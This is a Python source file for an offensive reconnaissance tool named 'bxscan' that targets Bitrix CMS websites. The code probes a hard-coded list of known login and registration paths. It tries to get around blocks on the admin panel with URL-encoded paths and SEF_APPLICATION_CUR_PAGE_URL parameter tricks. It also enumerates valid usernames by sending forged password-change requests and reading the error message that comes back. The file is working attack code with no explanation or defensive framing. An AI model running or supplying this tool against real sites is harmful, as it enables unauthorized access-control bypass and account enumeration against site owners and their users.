import argparse
import requests
import time
from colorama import Fore

def fuzz_dirs(base_url, dirs, headers, proxy, fuzz_type):
    endpoints = []
    for dir in dirs:
        time.sleep(0.5)
        url = f"{base_url}/{dir}"
        response = send_request(url, headers, proxy)
        if (fuzz_type == "login" and response.status_code == 200) or (fuzz_type == "register" and "Регистрация" in response.text):
            endpoints.append(url)
    return endpoints

def send_request(url, headers, proxy):
    return requests.get(url, headers=headers, proxies=proxy)

def check_block(base_url, headers, proxy):
    admin_url = f"{base_url}/bitrix/admin/"
    detail_url = f"{base_url}/bitrix/tools/catalog_export/yandex_detail.php"
    return send_request(detail_url, headers, proxy).status_code == 200 and send_request(admin_url, headers, proxy).status_code == 403

def enum_users(user_list, login_endpoints, headers, proxy):
    valid_users = []
    login_endpoint = login_endpoints[0]
    for user in user_list:
        time.sleep(0.5)
        payload = {
            'AUTH_FORM': 'Y',
            'TYPE': 'CHANGE_PWD',
            'USER_LOGIN': user,
            'USER_CHECKWORD': '1'
        }
        url = f"{login_endpoint}?change_password=yes"
        response = requests.post(url, data=payload, headers=headers, proxies=proxy)
        if "Пароль должен  быть не менее 6 символов длиной." in response.text:
            valid_users.append(user)
    return valid_users

def main():
    parser = argparse.ArgumentParser(description="Bitrix recon tool")
    parser.add_argument("-t", "--target", required=True, help="Base URL of the Bitrix website")
    parser.add_argument("-p", "--proxy", required=False, help="HTTP Proxy server (http://<IP>:<port>)")
    parser.add_argument("-u", "--useragent", required=False, help="Use specific User-Agent")
    parser.add_argument("-w", "--wordlist", required=False, help="Use custom username wordlist")
    args = parser.parse_args()

    base_url = args.target
    print(Fore.CYAN + "[*] Starting bxscan 0.1.1 against", base_url)

    if args.useragent:
        headers = {'User-Agent': args.useragent}
        print(Fore.CYAN + "[*] Using", args.useragent, "as User-Agent")
    else:
        headers = {'User-Agent': 'bxscan/0.1.1'}
        print(Fore.CYAN + "[*] Using default User-Agent")

    if args.proxy:
        print(Fore.CYAN + "[*] Using HTTP proxy server", args.proxy)
        proxy = {'http': args.proxy}
    else:
        proxy = None

    wordlist = args.wordlist

    login_dirs = ["bitrix/admin/",
    'bitrix/tools/catalog_export/yandex_detail.php',
    "bitrix/tools/autosave.php",
    "bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php",
    "bitrix/components/bitrix/map.yandex.search/settings/settings.php",
    "bitrix/tools/upload.php",
    "bitrix/components/bitrix/desktop/admin_settings.php",
    "bitrix/components/bitrix/player/player_playlist_edit.php",
    "pewpew/?SEF_APPLICATION_CUR_PAGE_URL=/bitrix/admin/",
    "pewpew/?SEF%20APPLICATION%20CUR%20PAGE_URL=/bitrix/admin/",
    "pewpew/?SEF+APPLICATION%20CUR+PAGE[URL=/bitrix/admin/",
    "bitrix/tools/sale/discount_reindex.php",
    "bitrix/tools/sale/basket_discount_convert.php",
    "auth/",
    "crm/",
    "auth/oauth2/",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/custom-registration/index.php",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/my-components/news_list.php",
    "bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php"]

    blocked = check_block(base_url, headers, proxy)
    if blocked:
        print(Fore.YELLOW + "[!] Admin panel block detected, trying to bypass...")
        bypass_dir = "%2e/%62%69%74%72%69%78/%2e/%61%64%6d%69%6e/"
        if send_request(f"{base_url}/{bypass_dir}", headers, proxy).status_code == 200:
            print(Fore.GREEN + "[+] Found admin panel endpoint (replace /bitrix/admin/ with URL Encode):")
            print(f"{base_url}/{bypass_dir}")
        else:
            print(Fore.RED + "[-] Couldn't bypass admin panel restrictions.")


    login_endpoints = fuzz_dirs(base_url, login_dirs, headers, proxy, "login")
    if login_endpoints:
        print(Fore.GREEN + "[+] Found Bitrix login endpoints:")
        for dir in login_endpoints:
            print(dir)
    else:
        print(Fore.RED + "[-] No login endpoints found.")

    user_list = ['test', 'admin', 'bitrix', 'testtest', 'root', 'guest', 'user', 'adm', 'administrator', 'demo']
    if wordlist:
        print(Fore.CYAN + "[*] Using username wordlist", wordlist)
        with open(wordlist, 'r') as f:
            user_list = [username.strip() for username in f.readlines()]
    else:
        print(Fore.CYAN + "[*] Using default username wordlist (Top10)")

    valid_users = enum_users(user_list, login_endpoints, headers, proxy)
    if valid_users:
        print(Fore.GREEN + "[+] Usernames found:")
        for user in valid_users:
            print(user)
    else:
        print(Fore.RED + "[-] No usernames found.")

    register_dirs = ["bitrix/wizards/bitrix/demo/public_files/ru/auth/?register=yes",
    "auth/?register=yes",
    "crm/?register=yes",
    "auth/oauth2/?register=yes",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/custom-registration/index.php",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/my-components/news_list.php?register=yes",
    "bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php?register=YES&sf_EMAIL=",
    "bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/personal/profile/index.php?register=yes",
    "bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/board/my/index.php?register=yes",
    "bitrix/modules/forum/install/admin/forum_index.php",
    "bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php?register=yes"
    ]

    register_endpoints = fuzz_dirs(base_url, register_dirs, headers, proxy, "register")
    if register_endpoints:
        print(Fore.GREEN + "[+] Found Bitrix registration endpoints:")
        for dir in register_endpoints:
            print(dir)
    else:
        print(Fore.RED + "[-] No registration endpoints found.")

if __name__ == "__main__":
    main()
